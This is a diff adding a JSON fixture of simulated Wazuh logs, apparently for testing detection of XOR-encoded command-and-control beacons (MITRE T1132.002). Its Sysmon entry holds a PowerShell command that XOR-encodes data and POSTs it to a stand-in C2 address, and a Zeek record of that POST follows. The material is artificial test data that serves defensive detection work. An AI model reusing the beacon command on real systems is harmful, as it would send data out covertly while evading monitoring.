@@ -1,0 +1,140 @@
+{
+  "metadata": {
+    "technique_id": "T1132.002",
+    "technique_name": "Data Encoding: Non-Standard Encoding",
+    "tactic": "command-and-control",
+    "description": "Custom XOR-encoded C2 beacons to evade signature detection",
+    "campaign": "33",
+    "batch": "14",
+    "expected_detection": "LOW",
+    "attack_time": "2026-02-10T14:22:00.000Z",
+    "target_host": "WS01",
+    "simulated_c2": "100.100.100.100"
+  },
+  "logs": [
+    {
+      "timestamp": "2026-02-10T14:22:00.000Z",
+      "rule": {
+        "level": 3,
+        "description": "Sysmon - Event 1: PowerShell with XOR encoding",
+        "id": "100101",
+        "mitre": {
+          "id": [
+            "T1132.002"
+          ],
+          "tactic": [
+            "Command and Control"
+          ],
+          "technique": [
+            "Non-Standard Encoding"
+          ]
+        },
+        "groups": [
+          "sysmon",
+          "sysmon_event1"
+        ]
+      },
+      "agent": {
+        "id": "020",
+        "name": "WS01",
+        "ip": "198.51.100.20"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "id": "1707578520.000001",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "location": "EventChannel",
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "1",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "computer": "WS01.corp.local",
+            "systemTime": "2026-02-10T14:22:00.000Z"
+          },
+          "eventdata": {
+            "utcTime": "2026-02-10 14:22:00.000",
+            "processGuid": "{A1B2C3D4-1234-5678-90AB-CDEF12345684}",
+            "processId": "6789",
+            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "commandLine": "powershell.exe -NoP -C \"$x=[byte[]](0x1a,0x2b,0x3c); $k=0x5a; $d=$x|%{$_-bxor$k}; Invoke-WebRequest -Uri 'http://100.100.100.100/beacon' -Body $d\"",
+            "currentDirectory": "C:\\Users\\Public\\",
+            "user": "CORP\\attacker",
+            "integrityLevel": "Medium",
+            "hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+            "parentProcessGuid": "{A1B2C3D4-1234-5678-90AB-CDEF12345670}",
+            "parentProcessId": "3456",
+            "parentImage": "C:\\Windows\\System32\\cmd.exe",
+            "parentCommandLine": "cmd.exe"
+          }
+        }
+      },
+      "fomorian_test": true,
+      "fomorian_batch": "14",
+      "fomorian_campaign": "33"
+    },
+    {
+      "timestamp": "2026-02-10T14:22:02.000Z",
+      "rule": {
+        "level": 3,
+        "description": "Zeek - HTTP POST with unusual character distribution",
+        "id": "100001",
+        "mitre": {
+          "id": [
+            "T1132.002"
+          ],
+          "tactic": [
+            "Command and Control"
+          ],
+          "technique": [
+            "Non-Standard Encoding"
+          ]
+        },
+        "groups": [
+          "zeek",
+          "zeek_http"
+        ]
+      },
+      "agent": {
+        "id": "001",
+        "name": "GW01",
+        "ip": "198.51.100.1"
+      },
+      "manager": {
+        "name": "wazuh.manager"
+      },
+      "id": "1707578522.000001",
+      "decoder": {
+        "name": "zeek"
+      },
+      "location": "zeek_http",
+      "data": {
+        "zeek": {
+          "ts": "1707578522.000000",
+          "uid": "X1a2b3c4d5e6f7g8h9",
+          "id.orig_h": "198.51.100.20",
+          "id.orig_p": "65234",
+          "id.resp_h": "100.100.100.100",
+          "id.resp_p": "80",
+          "trans_depth": "1",
+          "method": "POST",
+          "host": "100.100.100.100",
+          "uri": "/beacon",
+          "version": "1.1",
+          "user_agent": "Mozilla/5.0",
+          "request_body_len": "128",
+          "response_body_len": "64",
+          "status_code": "200",
+          "status_msg": "OK",
+          "tags": "[]"
+        }
+      },
+      "fomorian_test": true,
+      "fomorian_batch": "14",
+      "fomorian_campaign": "33"
+    }
+  ]
+}
